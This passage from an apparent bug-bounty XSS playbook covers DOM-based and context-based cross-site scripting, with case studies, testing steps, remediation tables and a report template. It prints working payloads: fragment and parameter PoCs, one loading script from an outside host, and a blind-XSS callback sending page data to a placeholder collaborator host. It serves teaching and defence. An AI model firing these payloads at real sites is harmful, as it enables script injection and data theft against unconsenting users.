        →  browser parses it as markup → script executes
````

#### 2.1 Sinks confirmed in this archive

| Sink | Case | Evidence |
| --- | --- | --- |
| `document.write` | `DOM-021` (`248560`) | reporter quotes the client code writing `build`/`other` params via `document.write` |
| `innerHTML` on a `<div>` used as a *parser* | `DOM-020` (`247246`) | `stripHtml` sets `div.innerHTML = html.replace(/<\/?\w+[^>]*\/?>/g,"")` then returns `innerText` |
| String-built `<a href='...'>` | `FILT-036` (`189834`) | `strChild = "<a href='" + document.URL + "' …>"` |
| `.innerHTML` for a label | `DOM-005` (`105688`) | fragment appended to `checkout-success/16893` |
| `location.href` / `window.location` | `DOM-014` (`209736`) | `pr_zip_location` → script URL loaded in the target origin |

`DOM-020` (Grab) is the most instructive root cause in the archive, because the
filter is *real* but the parse is not neutralising. The code creates a detached `div`,
assigns `innerHTML`, and reads back `innerText`, intending to strip tags:

````js
var stripHtml = (function () {
  var div = document.createElement('div');
  return function (html) {
    div.innerHTML = html.replace(/<\/?\w+[^>]*\/?>/g, "");
    return (div.innerText || div.textContent);
  };
})();
````

The reporter's bypass payload was
`%3C%3Ca/%3A%3C%22a%22%3Eimg%20src%3D%23%20onerror%3Dconfirm%28%27XSSED%27%29%3E`
— i.e. `<a/:<"a">img src=# onerror=…>`. The regex expects a word character
immediately after `<` or `</`; `<a/` and `<:` do not match, so the malformed tag is
**not stripped** and still reaches the parser.

This is a *parser/regex differential* — the same root-cause family as the SVG
allow-list bypass in [`Stored-XSS.md`](../../Stored-XSS.md) §7 (`STOR-144`). Treat "I wrote a
regex to strip tags" as an unproven control until you have broken it.

#### 2.2 Fragments never reach the server

`DOM-005` (LeaseWeb) is the minimal form:
````
https://www.leaseweb.com/checkout-success/16893#"><img src=x onerror=alert(document.cookie)>
````
`BROW-004` (`119453`, Veris) is the same shape on `https://www.veris.in/?#<img src=x onerror=alert(1)>`.

Because the fragment is not transmitted, a reflected-XSS report on the same URL would
be wrong, and — critically — **your HTTP scanner will not find these.**

### 3. Attack Surface and Preconditions

| Source | Case | Note |
| --- | --- | --- |
| `location.hash` | `DOM-005`, `BROW-004` | not sent to server; invisible to WAF/scanners |
| `location.search` read by JS | `DOM-021` (`build`, `other` params) | source *is* in the request, sink is client-side |
| `document.referrer` | `FILT-036` (`189834`) | third-party controlled by the referring page |
| `document.URL` | `FILT-036` | includes fragment, so fragment payloads land here |
| `postMessage` data | `DOM-018` (`231053`) | any remote origin |
| Redirect / store-locator params | `DOM-014` (`209736`) | client-side redirector |
| Browser-extension injected DOM | `DOM-016` (`220494`) | source is entirely third-party code |
| `location` on error pages | `DOM-015` (`213227`) | server-rendered page, client-side sink |

**Preconditions:** none beyond loading the URL. DOM XSS often has **no victim
interaction at all** — this is the cheapest XSS class to weaponise, which is why
`DOM-018` (`$3,000`) affected "all Shopify stores."

### 4. Manual Testing Methodology

DOM XSS cannot be found by scanning. It requires reading client-side code.

1. **Fingerprint the front end.** Note framework (jQuery, Angular, React, Vue),
   bundler, and whether a CDN library is in use.
2. **Harvest candidate sinks** across every JS file:
   ```bash
   # newly authored — run against a target you are authorised to test
   grep -rnoE "(innerHTML|outerHTML|insertAdjacentHTML|document\.write|\.write\(|eval|new Function|setTimeout\(['\"][^)]|setInterval\(['\"][^)]|location\.hash|document\.referrer|document\.URL|window\.name|postMessage)" js/
   ```
3. **Read backwards from each sink** to find the source. A sink with no reachable
   attacker-controlled source is a false positive; a sink fed by `location.hash` or
   `document.referrer` is a candidate.
4. **Test the fragment first** — `#H1XSSDOM9` — and check the rendered DOM with
   DevTools (`document.querySelector('#'+id)` fails if it was parsed into an element).
5. **Confirm no request carried the payload.** Open DevTools → Network, filter, and
   verify. If it appears in a request, you have reflected XSS instead.
6. **Check whether the server *also* reflects it.** Many endpoints are both. Report
   both; they are different bugs with different fixes.
7. **For `postMessage`, check `event.origin` validation** and whether the escaping is
   bypassable (`DOM-018`).
8. **For redirectors, follow the redirect.** `DOM-014` loads an attacker-hosted
   `xss.js` **in the target origin** — technically a JSONP/script-injection sink
   rather than a parse sink.

### 5. Input and Output Context Analysis

DOM sinks are context-sensitive in the same way, with two additions unique to
client-side code:

| Sink | Dangerous | Safe alternative |
| --- | --- | --- |
| `innerHTML` | any markup | `textContent` |
| `document.write(w)` | any markup | `document.createElement` + `textContent` |
| `insertAdjacentHTML` | any markup | `insertAdjacentText` |
| `jQuery $(w).html(v)` | any markup | `.text(v)` |
| `location = v` / `location.href = v` | `javascript:` / `data:` | scheme allow-list |
| `eval` / `new Function` / `setTimeout("…")` | arbitrary JS | avoid; use a real function reference |
| `<a href>` built by concatenation | attribute break-out | `el.setAttribute('href', v)` |

The `document.URL` case (`FILT-036`) is the instructive one. `document.URL` includes
the fragment, so a payload in the fragment reaches a sink that the author probably
believed only contained server-controlled data. Any use of `document.URL` or
`document.referrer` in string-built markup deserves immediate attention.

### 6. Test Cases and Proof-of-Concepts

#### 6.1 Historical payloads (verbatim from the cited reports)

| Case | Report | Source | Payload |
| --- | --- | --- | --- |
| DOM-020 | `247246` | `?xss=` param | `<a/:<"a">img src=# onerror=confirm('XSSED')>` |
| DOM-021 | `248560` | `build` GET param | `lodash"></script><h1>vagg-a-bond is here :D</h1><` |
| DOM-014 | `209736` | `pr_zip_location` | `//whitehat-hacker.com/xss.j?` |
| DOM-005 | `105688` | URL fragment | `#"><img src=x onerror=alert(document.cookie)>` |
| BROW-004 | `119453` | URL fragment | `https://www.veris.in/?#<img src=x onerror=alert(1)>` |
| DOM-015 | `213227` | search dialogue | not disclosed in the source |

#### 6.2 Newly authored illustrations (not from the archive)

Fragment probes — inert first:

````
#H1XSSDOM9                     → does anything read the fragment?
#"><h1>dom-marker              → markup control
#"><img src=x onerror=alert(1)>
#javascript:alert(1)           → only for location sinks
````

`postMessage` origin probe — establish whether `event.origin` is validated *before*
sending:

````js
// run in your own page, sending to the target's listener
targetWindow.postMessage({ probe: 'H1XSSDOM9' }, 'https://target.example');
````

`document.referrer` probe — a page you control that links to the target:

````html
<a href="https://target.example/path">go</a>
<!-- with a Referer containing: '"><h1>dom-marker -->
````

**Safe proof.** For DOM XSS, `alert` is usually fine because nothing persists — but
prefer writing a marker into `document.title` or `localStorage`, which demonstrates
execution without a modal that blocks automation.

### 7. Encoding, Filtering, and Parsing Behavior

Three distinct behaviours appear here, none of which is classic server-side escaping:

1. **Client-side sanitisation done by the wrong parser.** `DOM-020`'s `stripHtml`
   uses `innerHTML`+`innerText` as a sanitiser and a regex as a filter. Both are
   bypassable; the regex is bypassable by a character the author did not anticipate.
2. **`postMessage` escaping bypassable by object shape.** `DOM-018` (Shopify, `$3,000`)
   is the standout: the listener *did* attempt to escape incoming content, but by
   sending a **"clone-able" object per the HTML5 structured clone algorithm** the
   reporter bypassed the escaping. The team's summary: *"The report demonstrated a
   clever bypass of the escaping code we had in place to prevent code injection."*
   The lesson: **sanitisers must normalise to a primitive type before checking.**
3. **Server-side CSP as the only mitigation.** Nextcloud's `DOM-015` advisory gives
   **CVSS 2.6 (AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:N/A:N)**, CWE-79, rated **low**, with
   CWE-1021 (improper restriction of rendered UI layers) as the related weakness in
   the advisory's framing. Low is driven partly by the strict CSP.

### 8. Impact and Severity Considerations

DOM XSS impact matches its origin. The `DOM-018` case is instructive on breadth:

| Report | Program | Weakness | Severity | Bounty |
| --- | --- | --- | --- | --- |
| `231053` DOM-018 | Shopify | `XSS - DOM` | not disclosed | $3,000 |
| `220494` DOM-016 | Algolia | `XSS - Generic` | high | not disclosed |
| `248560` DOM-021 | Grabtaxi | `XSS - DOM` | medium | not disclosed |
| `247246` DOM-020 | Grabtaxi | `XSS - Generic` | medium | not disclosed |
| `209736` DOM-014 | Starbucks | `XSS - Generic` | medium | not disclosed |
| `213227` DOM-015 | Nextcloud | `XSS - Generic` | low | $250 |

The reporter of `DOM-014` set **Critical** personally: *"That allows to execute
absolutely arbitrary javascript in the context on teavana.com domain. As described in
#202011 that directly leads to theft of customer account data and account takeover,
hence I set severity to Critical."* The platform recorded **medium**. The gap is
worth studying: the reporter justified Critical via a **chained** account-takeover
path (`DOM-014` → `#202011`), which is exactly the kind of claim that must be
*demonstrated*, not asserted. See [`Context-Based-XSS.md`](../../Context-Based-XSS.md) for
the chaining discipline.

**Breadth is a real multiplier.** A DOM sink in a shared widget (`DOM-018` "affecting
all Shopify stores") or a popular embed is worse than an equivalent isolated bug,
because one fix location remediates every instance.

### 9. False Positives and Limitations

- **A sink is not a vulnerability.** Grepping for `innerHTML` produces many false
  positives where the value is a constant or a server-sanitised string. **Trace the
  source before reporting.**
- **Fragment payloads that hit the server are reflected XSS.** Verify in Network.
- **`document.write` of a same-origin trusted value** is not XSS. Provenance matters.
- **"Sanitised on write" is not proven by a clean render.** A `stripTags` helper may run
  on one path and not another. `DOM-020` is the direct counter-example: a filter that
  looked real and was broken.
- **Third-party code is not the target's bug** unless the target owns it or the
  injection is exploitable on the target. `DOM-016` (a browser extension injecting
  unsanitised HTML into GitHub.com) was accepted on Algolia's program because the
  extension was theirs. Attribute ownership correctly.
- **Report the CSP.** `DOM-015`'s `low` rating turned on it. Omitting a working CSP is
  the most common self-inflicted downgrade in this class.

### 10. Remediation and Regression Testing

#### 10.1 Remediation

| Instead of | Use |
| --- | --- |
| `el.innerHTML = v` | `el.textContent = v` |
| `el.outerHTML = v` | build a new node; `textContent` |
| `el.insertAdjacentHTML(p, v)` | `el.insertAdjacentText(p, v)` |
| `document.write(v)` | `document.createElement` + `textContent` |
| `$(el).html(v)` | `$(el).text(v)` |
| `location = v` | allow-list the scheme |
| `eval(v)` / `setTimeout(v)` | pass a function, not a string |

Plus:
- **`postMessage`: validate `event.origin` against an exact allow-list** before any
  processing, and coerce `event.data` to a primitive (`String()`, `Number()`) before
  sanitising — do not inspect the object.
- **Never concatenate `document.URL`, `location.href`, `document.referrer`, or
  `location.hash` into markup.** If a URL must be shown, set `textContent`.
- **Trust nothing from `localStorage`/`sessionStorage`** — it is attacker-writable via
  any same-origin XSS.
- **Deploy a Trusted Types policy** where the platform supports it; this is the
  structural fix for DOM XSS.

#### 10.2 Regression tests

| Test | Asserts |
| --- | --- |
| For every sink, set `textContent` and assert the string is literal | sink replaced |
| Fragment `#"><img src=x onerror=alert(1)>` → assert no element created | fragment safe |
| `postMessage` from an unlisted origin → assert handler ignores it | origin checked |
| `postMessage` with object payloads → assert coerced to primitive | no shape bypass |
| `document.referrer` containing `"><svg onload=…>` → assert inert | referrer not built into markup |
| `location` assignment to `javascript:`/`data:` → assert rejected | scheme allow-list |
| Confirm a CSP without `unsafe-inline` is present | defence in depth |

### 11. Historical Bug Bounty Case Studies

Sourced facts only. Inventory:
[`references/source-index.md`](../../references/source-index.md).

---

#### DOM-018 — XSS on any Shopify shop via the HTML5 structured clone algorithm in a postMessage listener

- **Program:** Shopify · **Report:** <https://hackerone.com/reports/231053>
- **Archive listing:** <https://h1.security.nathan.sx/shopify.html>
- **Weakness:** `Cross-site Scripting (XSS) - DOM` · **Bounty:** $3,000
- **Published / severity:** Not disclosed in the accessible source
- **Body inspected:** Yes — **full report**.

**Affected feature:** the `/:id/digital_wallets/dialog` endpoint, which initialises a
`postMessage` listener on page load.

**Root cause (researcher's description):** *"The endpoint includes a script that listens
for postMessages **without validating the origin** of messages. However, the impact of
the missing validation is very limited because the script attempts to escape any
content to prevent any HTML injection. By sending a specially crafted postMessage
containing a **'clone-able' object** (per the HTML5 structured clone algorithm) this
escaping can be bypassed allowing a malicious actor to obtain XSS."*

**Team summary, verbatim:** *"This issue is a XSS affecting all Shopify stores that can
be triggered via `windows.postMessage` from **any remote origin**. The report
demonstrated a clever bypass of the escaping code we had in place to prevent code
injection."*

**Why it matters here:** the clearest archived example of a *sanitiser bypass via data
shape*. Origin validation and escaping were both present and both insufficient.

---

#### DOM-020 — DOM-based XSS affecting all pages from grab.com (regex/parser differential)

- **Program:** Grabtaxi · **Report:** <https://hackerone.com/reports/247246>
- **Archive listing:** <https://h1.security.nathan.sx/grab.html>
- **Weakness:** `Cross-site Scripting (XSS) - Generic` · **Severity:** medium
- **Bounty:** Not disclosed in the source
- **Body inspected:** Yes — **full report**.

**Affected feature:** the `stripHtml` helper shown in §2.1, used across
`https://www.grab.com/`.

**Note on history:** the reporter stated this *"wasn't properly patched so I managed to
bypass the regular expressioned that was added into the function"* — i.e. the function
*did* have a filter, and this report is the **bypass**. Same root cause as
[`Filter-Bypass-and-Encoding.md`](../../Filter-Bypass-and-Encoding.md), client-side variant.

**PoC (as submitted):**
````
https://www.grab.com/sg/partnerships/?xss=%3C%3Ca/%3A%3C%22a%22%3Eimg%20src%3D%23%20onerror%3Dconfirm%28%27XSSED%27%29%3E
````

**Root cause:** `html.replace(/<\/?\w+[^>]*\/?>/g, "")` requires a word character after
`<` or `</`. `<a/` and `<:` do not match, so those constructs pass through unstripped
and are still parsed by the browser when assigned via `innerHTML`.

---

#### DOM-021 — DOM XSS at parcel.grab.com/assets/bower_components/lodash/perf/

- **Program:** Grabtaxi · **Report:** <https://hackerone.com/reports/248560>
- **Archive listing:** <https://h1.security.nathan.sx/grab.html>
- **Weakness:** `Cross-site Scripting (XSS) - DOM` · **Severity:** medium
- **Bounty:** Not disclosed in the source
- **Body inspected:** Yes — **full report**.

**Affected feature:** `https://parcel.grab.com/assets/bower_components/lodash/perf/`.
The reporter traces the flow to
`.../asset/perf-ui.js`, noting the *default* value of a `switch` branch is set to
`build`, matching the user-injected parameter.

**Root cause (reporter):** *"the value given in `build` and `other` GET parameters are
accessed by client side script and written on page using `document.write` without
output encoding."*

**PoC (as submitted, `build` parameter):**
````
https://parcel.grab.com/assets/bower_components/lodash/perf/?build=lodash%22%3E%3C/script%3E%3Ch1%3Evagg-a-bond%20is%20here%20:D%3C/h1%3E%3C
````

**Verification environment (as stated):** Mozilla Firefox (latest).

**Methodological note:** the report opens by defining DOM XSS and citing OWASP —
useful practice. State your browser and version.

---

#### DOM-014 — DOM XSS on teavana.com via `pr_zip_location`

- **Program:** Starbucks · **Report:** <https://hackerone.com/reports/209736>
- **Archive listing:** <https://h1.security.nathan.sx/starbucks.html>
- **Weakness:** `XSS - Generic` · **Severity (platform):** medium · **Bounty:** not disclosed
- **Body inspected:** Yes — **full report**.

**PoC (as submitted):**
````
http://www.teavana.com/us/en/tea/green-tea/winterberry-tea-blend-32601.html?pr_zip_location=//whitehat-hacker.com/xss.j?
````

**Reporter's stated impact, verbatim:** *"That allows to execute absolutely arbitrary
javascript in the context on `teavana.com` domain. As described in #202011 that directly
leads to theft of customer account data and account takeover, hence I set severity to
Critical. Also, I have discovered a number of other XSS attacks on similar pages,
involving other parameters and sinks. Should I submit them all as individual bug
reports?"*

The cited sink is in `full.js`:
````js
var DR = Z(DS) + "/content/" + k(DQ) + "/contents.js";
````

**Why it matters here:** (a) an honest, explicit Critical claim with a named chain
(`#202011`) rather than an assumed one; (b) evidence that *this parameter is one of
many* — the reporter noticed sibling sinks unprompted. Act on that: report the
siblings or say you are still testing, exactly as this researcher did.

---

#### DOM-016 — Unsanitised HTML from a browser extension leading to XSS on GitHub.com

- **Program:** Algolia · **Report:** <https://hackerone.com/reports/220494>
- **Archive listing:** <https://h1.security.nathan.sx/algolia.html>
- **Weakness:** `Cross-site Scripting (XSS) - DOM` · **Severity:** high
- **Bounty:** Not disclosed in the source
- **Body inspected:** Yes — **full report**.

**Affected feature:** the *Awesome Autocomplete for GitHub* extension, owned by
Algolia, rendering into the DOM of `github.com`.

**Reproduction (as submitted):** search GitHub for `'"><img src=x onerror=` — a broken
`<img>` element appears. Search for `a'"><h1` — *"Because of a specific repository
name being loaded, a JavaScript alert dialog will appear."*

**Test environment (stated):** Chrome 57.0.2987.133, Safari 10.1, macOS Sierra
10.12.4 / Windows 7 x64.

**Researcher's own disclaimer, verbatim:** *"I **do not have ownership nor
affiliation** with the repository and user names in this report, nor the final
JavaScript alert dialog."* Declaring which elements are yours is the correct practice
when demonstrating XSS with third-party data.

**Related:** [`Browser-Extension-and-Messaging-XSS.md`](../../Browser-Extension-and-Messaging-XSS.md).

---

#### DOM-015 — DOM XSS vulnerability in search dialogue (NC-SA-2017-007)

- **Program:** Nextcloud · **Report:** <https://hackerone.com/reports/213227>
- **Advisory:** <https://nextcloud.com/security/advisory/?id=nc-sa-2017-007>
- **Archive listing:** <https://h1.security.nathan.sx/nextcloud.html>
- **Weakness:** `XSS - Generic` · **Severity:** low · **Bounty:** $250
- **Body inspected:** No — withheld. Evidence level: **partial report**.

Official team disclosure summary, verbatim:

> **Risk level:** Low
> **CVSS v3 Base Score:** 2.6 (AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:N/A:N)
> **CWE:** Improper Neutralization of Input During Web Page Generation
> ('Cross-site Scripting') (CWE-79)
>
> **Description:** Inadequate escaping lead to XSS vulnerability in the search module.
> To be exploitable an user has to write or paste malicious [content]

Full payload and endpoint: **Not disclosed in the source.**

---

#### Supporting DOM sources (full bodies retrieved)

- **DOM-005** `105688` — <https://hackerone.com/reports/105688> — LeaseWeb, `$100`.
  Fragment-injected XSS on `/checkout-success/<id>`; reporter states it *"works in all
  browsers I suppose and regardless if the user is currently authenticated or not."*
- **FILT-036** `189834` — <https://hackerone.com/reports/189834> — Informatica, high.
  `bindBreadCrumb()` builds `"<a href='" + document.URL + "' …>"` and the same for
  `document.referrer`; the body quotes the full vulnerable JavaScript. Strongest
  single artefact in the archive for the `document.URL`/`document.referrer` sink class.
- **DOM-* / BROW-004** `119453` — <https://hackerone.com/reports/119453> — Veris.
  `https://www.veris.in/?#<img src=x onerror=alert(1)>`; the reporter linked the
  vulnerable bundled source in `wp-content/plugins/Ultimate_VC_Addons/assets/min-js/ultimate.min.js`.

### 12. Professional Vulnerability Report Template

`````markdown
# DOM-based XSS in <component> via <source> into <sink>

## Summary
<Source> is read by <function> and written to <sink> without encoding, executing in
the <origin> origin. State explicitly that no request carries the payload.

## Severity
<high|medium|low> — <origin impact; note CSP and cookie flags>

## Affected endpoint
`https://<host>/<path>` · Source: `location.hash` | `postMessage` | `document.referrer` | …
Program: <name> · Date: <YYYY-MM-DD>

## Vulnerability details
### Source → sink
````
<source>  →  <function/line>  →  <sink>  →  browser parses as markup
````

### Vulnerable code
````js
<the actual sink line(s) from the source, quoted>
````

### Root cause
<Why encoding is absent or bypassable — including any regex or sanitiser and its bypass.>

## Proof of concept
````
https://<host>/<path>#"><img src=x onerror=alert(1)>
````
1. Open DevTools → Network and reload.
2. Confirm **no request contains the payload**.
3. Confirm `alert` fires in origin `<origin>`.
4. Paste the rendered DOM snippet showing the injected `<img>`.

## Remediation
<textContent / DOM construction / origin allow-list; see §10.1>

## References
<advisory / CVE / prior art>
`````

**Reporting discipline.** Include the Network-panel proof that nothing was sent —
it is the claim that distinguishes your report. Include your browser and version.
Quote the actual sink line; DOM findings without the vulnerable code are hard to act
on. Disclose any CSP.

### 13. References

- OWASP Cheat Sheet — DOM based XSS: <https://cheatsheetseries.owasp.org/cheatsheets/DOM_Based_XSS_Cheat_Sheet.html>
- OWASP — DOM XSS prevention rules: <https://owasp.org/www-community/attacks/xss/>
- MDN — `Window.postMessage()` security concerns: <https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage>
- MDN — Structured clone algorithm: <https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm>
- Chrome — Trusted Types: <https://developer.chrome.com/blog/trusted-types/>
- DOM Invader (browser extension for DOM sink discovery): <https://github.com/bishopfox/scipipy>
- Reports cited: <https://hackerone.com/reports/231053>, <https://hackerone.com/reports/247246>,
  <https://hackerone.com/reports/248560>, <https://hackerone.com/reports/209736>,
  <https://hackerone.com/reports/220494>, <https://hackerone.com/reports/213227>,
  <https://hackerone.com/reports/105688>, <https://hackerone.com/reports/189834>,
  <https://hackerone.com/reports/119453>

### 14. Research Gaps and Further Investigation

- **`DOM-015` body withheld.** Nextcloud published a CVSS vector and CWE but not the
  payload. Worth reconstructing from the advisory family if the code path is public.
- **The `DOM-020` bypass is unverified against the live `stripHtml`.** The regex
  analysis in §2.1 is reasoned from the source quoted in the report, not re-tested.
  Re-derive the minimal bypass before relying on it.
- **Very small sample.** 22 sources is thin for the most prevalent modern XSS class.
  The archive under-represents 2017+ DOM sinks because most modern DOM XSS reports are
  private. Supplement with primary research.
- **Untested angles worth pursuing:** `DOMPurify`/sanitiser configuration drift;
  Trusted Types as a remediation in a real codebase; `Range.createContextualFragment`
  and `setHTMLUnsafe()` as modern sinks absent from 2017 material; DOM clobbering as a
  stored-XSS persistence mechanism.



---

<!-- PART 5 of 12 :: Context-Based-XSS.md -->

## Context-Based XSS

### 1. Overview

This is the largest playbook in the knowledge base: **196 sources**, 168 with full
report bodies. It is deliberately a broad bucket, and that requires an explanation.

HackerOne's weakness taxonomy assigns `Cross-site Scripting (XSS) - Generic` to any
report it could not file under Reflected, Stored, or DOM. That "Generic" label is not
a technique — it is an absence of classification. Grouping all of it under one
technique would be as useless as keeping it as one undifferentiated list.

What actually distinguishes these reports is **where the bytes land and who executes
them**. This playbook therefore classifies them by *context and trust boundary*
rather than by payload. That is the distinction that changes your testing method:
you cannot test a URL context with an HTML payload and expect a useful result.

#### Why this is one file and not five

The root cause is identical in all of them — missing context-correct output encoding.
The fix is identical — encode per context. Splitting into per-context files would
duplicate the same remediation section five times for no gain. What genuinely differs is
the **methodology**, and that is organised as sub-playbooks inside this file (§4).

The cases that warrant *separate* playbooks because their methodology differs
substantially have been split out: [`DOM-Based-XSS.md`](../../DOM-Based-XSS.md),
[`Self-XSS.md`](../../Self-XSS.md), [`File-Upload-and-SVG-XSS.md`](../../File-Upload-and-SVG-XSS.md),
[`Framework-and-Template-XSS.md`](../../Framework-and-Template-XSS.md),
[`Browser-Extension-and-Messaging-XSS.md`](../../Browser-Extension-and-Messaging-XSS.md),
and [`HTML-Injection.md`](../../HTML-Injection.md).

### 2. Root Cause and Technical Mechanics

The common flow, with the context made explicit:

````
attacker input  →  template or JS  →  [CONTEXT]  →  browser parses  →  execution
````

Sub-classes present in this archive, with a sourced example each:

#### 2.1 Blind XSS — the payload fires somewhere else

`CONT-155` (`158461`, Mapbox, $750): the team summary states the researcher reported
*"a stored blind XSS issue on www.mapbox.com/contact"*, fixed by escaping the user
message before forwarding to a middleware server.

`CONT-185` (`197337`, Rockstar, medium, $650): *"an attacker would submit a malicious
XSS payload in an input field but cannot really…"* — the excerpt ends there, but the
summary states the result was *"a XSS vulnerability being exploited on an internal
Rockstar Games domain."*

**Testing consequence:** blind XSS cannot be verified by looking at the submission
page. Use an out-of-band receiver (a collaborator endpoint, `window.name`, DNS
callback) and prove execution before reporting.

#### 2.2 Chained impact — the argument for a higher rating

`DOM-014` (`209736`, Starbucks) explicitly claimed Critical via a chain:
*"As described in `#202011` that directly leads to theft of customer account data and
account takeover, hence I set severity to Critical."* The platform recorded medium.

`CONT-126` (`125112`, Uber getrush, $3,000): reflected XSS via an unescaped
`utm_campaign` marketing parameter — no chain needed, because the marketing domain
carried the trust.

Chains raise severity **only when demonstrated**. Asserting a chain you have not walked
is the most common over-claim in this class.

#### 2.3 Third-party embeds and integration boundaries

`REFL-023` (`134061`, Uber Newsroom, $2,000): a Livefyre Media Wall embed takes a
`lf-content` parameter of the form
`controlled-domain:GET param 'collection_id':GET param 'content_id'` and fetches JSON
from `https://bootstrap.<controlled-domain>/api/v3.0/content/thread/…`, which is then
rendered. The researcher hosted the JSON on their own domain.

`CONT-095` (`99245`, Mapbox, $1,000): stored XSS in the share page of a hosted map.

**Testing consequence:** whenever a page embeds third-party widgets, ask what the
widget *fetches* and from where. Content the widget pulls from an attacker-controlled
host and renders in the trusted origin is stored XSS with an extra hop.

#### 2.4 Parser and rendering contexts

`CONT-035` (`18691`, Phabricator, $1,000) is a **nested-parsing** failure. The
researcher supplied `{meme, src= http://dummy//onerror=eval(prompt(1))// }` and
explained the mechanism:

> "Nested parsing is causing the src value to be treated as a link which is
> automatically made link by fabricator. So, a whole mess-up of syntax happening there.
> `\\` are being used as space separators since those replaced."

Here an inner parser transforms the value *after* the outer parser has validated it —
the canonical **parser-order** vulnerability. The reporter's proposed fix was also
honest about its uncertainty: *"May be to avoid nested parsing, it messes up things.
But the choice is yours since you have more knowledge of the application needs."*

`CONT-057` (`53098`, Twitter, $1,400): `unsafe_link` reflected into markup; the
researcher noted *"in Firefox and Chrome, it is blocked by CSP :)"* and demonstrated in
IE only.

### 3. Attack Surface and Preconditions

| Surface | Case | Note |
| --- | --- | --- |
| Marketing/tracking parameters | `CONT-126` | `utm_campaign` |
| Error and safety-warning pages | `CONT-057`, `CONT-126` | often built by a different, less-reviewed codebase |
| Third-party embeds | `REFL-023` | content fetched from attacker host |
| Admin moderation queues | `CONT-185` | privileged viewer, blind |
| Contact/support forms | `CONT-155` | blind, forwarded to middleware |
| Rich-text / wiki editors | `CONT-035` | nested parsing |
| Currency / locale formatters | `CONT-098` (`104359`, Shopify, $1,000) | admin-configured formatting rendered in storefront |
| Legacy API and legacy frameworks | `CONT-057`, `HTML-002` | different escaping discipline |

### 4. Manual Testing Methodology

Because the payloads vary, methodology is organised by **sub-playbook**.

#### 4.1 Context triage (run this first, always)

1. Send `H1XSSMARKER9` in every parameter.
2. Locate the marker in the raw response; note the **immediately preceding and
   following characters**.
3. Classify the context: HTML text / HTML attribute / JS string / URL / CSS /
   `<script>` block / comment / none.
4. Choose the payload from that context's column in §5. Do not skip this — most wasted
   XSS effort comes from testing a JS-context string with an HTML payload.

#### 4.2 Blind XSS

1. Register a collaborator endpoint you control.
2. Submit `<img src=x onerror=new Image().src='https://COLLAB/?d='+document.domain>`
   through the form, or the `window.name` variant for `document.domain` capture.
3. Confirm receipt. Only then report.
4. Never file blind XSS on suspicion — the absence of a callback may mean the sink is
   admin-only and simply unvisited.

#### 4.3 Embedded and integrated content

1. Inventory third-party scripts on the page (`grep` the HTML for third-party origins).
2. For each, enumerate every parameter it accepts in the URL.
3. For network-fetching widgets, determine the fetched URL's shape — can you control
   the origin *and* the response body? (`REFL-023` did exactly this.)
4. Determine the execution origin for the injected content.

#### 4.4 Chaining

1. Establish the XSS first, on its own.
2. Identify what the origin can reach — other same-origin endpoints, session
   identifiers, CSRF tokens, administrative actions.
3. Demonstrate the second stage concretely, or do not claim it. `DOM-014` cited a
   separate report as the chain's second stage; that is the honest form.

#### 4.5 Legacy and modern surface coverage

Test both the current frontend and any legacy/marketing/partner subdomain. `CONT-126`
(`getrush.uber.com`) and `CONT-057` (`twitter.com/safety/`) are both non-core
properties — the cheapest findings in the archive.

### 5. Input and Output Context Analysis

This is the operational core of the playbook. Full table also in
[`Reflected-XSS.md`](../../Reflected-XSS.md) §5; the additions here are the context→payload
mapping and the cases that evidence each.

| Context | Minimal break-out | Sink character | Evidence in this archive |
| --- | --- | --- | --- |
| HTML text | `"><h1>x` | `<` `>` | `REFL-024`, `HTML-008` |
| Attribute, quoted | `x" onmouseover=alert(1) x="` | `"` | `FILT-028`, `HTML-002` |
| Attribute, unquoted | `x onmouseover=alert(1)` | space | `REFL-025`, `CONT-057` |
| JS string, single-quoted | `';alert(1);//` | `'` | `REFL-056` |
| JS string, double-quoted | `";alert(1);//` | `"` | `FILT-017` |
| `<script>` block | `</script><svg onload=alert(1)>` | `</script>` | `REFL-078` |
| `href` / URL | `javascript:alert(1)//` | scheme | `STOR-147`, `BROW-008` |
| CSS (IE only) | `width:expression(alert(1))` | `:` `(` | `FILT-028` |
| Nested parser | depends on inner parser | parser-dependent | `CONT-035` |
| No context (dead value) | — | — | `HTML-010` — correctly reported as non-XSS |

The last row matters: `HTML-010` (`198907`, VK.com) stored `<img src=x` without a
closing bracket, observed that it *"will be parsed in that area, but after saving it,
it won't parse,"* and **declined to claim XSS**. Correct call — see §9.

### 6. Test Cases and Proof-of-Concepts

#### 6.1 Historical payloads (verbatim from the cited reports)

| Case | Report | Surface | Payload |
| --- | --- | --- | --- |
| CONT-126 | `125112` | `utm_campaign` | `tttttt'%3C/script%3E%3Cscript%3Ealert(0)%3C/script%3E` |
| CONT-057 | `53098` | `unsafe_link` | `http://example.com onmouseover=alert(1) style=font-size:100pt` |
| CONT-035 | `18691` | meme `src` | `{meme, src= http://dummy//onerror=eval(prompt(1))// }` |
| REFL-023 | `134061` | `lf-content` | `danylod.com/uber.php?:131560603:307477931` + attacker-hosted JSON |
| CONT-098 | `104359` | currency formatting | admin-configured format rendered in storefront |
| HTML-001 | `2735` | first-name field → invite email | `You have been hacked. Click <a href="http://phishing-site">here</a> to reset your password.<div style="display:none">` |

#### 6.2 Newly authored illustrations (not from the archive)

**Context probe matrix.** Newly authored; inert markers by design. Use against targets
you are authorised to test.

| Context | Inert probe | Executable probe |
| --- | --- | --- |
| HTML text | `<h1>xss-marker` | `<img src=x onerror=alert(1)>` |
| Attribute (quoted) | `" onmouseover="xss-marker` | `" onmouseover="alert(1)` |
| Attribute (unquoted) | ` onmouseover=xss-marker` | ` onmouseover=alert(1)` |
| JS string `'…'` | `';xss-marker;//` | `';alert(1);//` |
| JS string `"…"` | `";xss-marker;//` | `";alert(1);//` |
| `<script>` block | `</script><h1>xss-marker` | `</script><svg onload=alert(1)>` |
| URL | `javascript:xss-marker//` | `javascript:alert(1)//` |

**Blind-XSS out-of-band receiver.** Newly authored.

````html
<!-- served from an origin you control -->
<img src="x" onerror="new Image().src='https://COLLAB/?domain='+document.domain+'&path='+location.pathname">
````

**Third-party widget inventory.** Newly authored.

````bash
# newly authored — run against an authorised target
curl -s "$URL" | grep -oE 'src="https?://[^"]+\.js[^"]*"' | sort -u
````

### 7. Encoding, Filtering, and Parsing Behavior

The distinct behaviours in this group:

| Behaviour | Case | Consequence |
| --- | --- | --- |
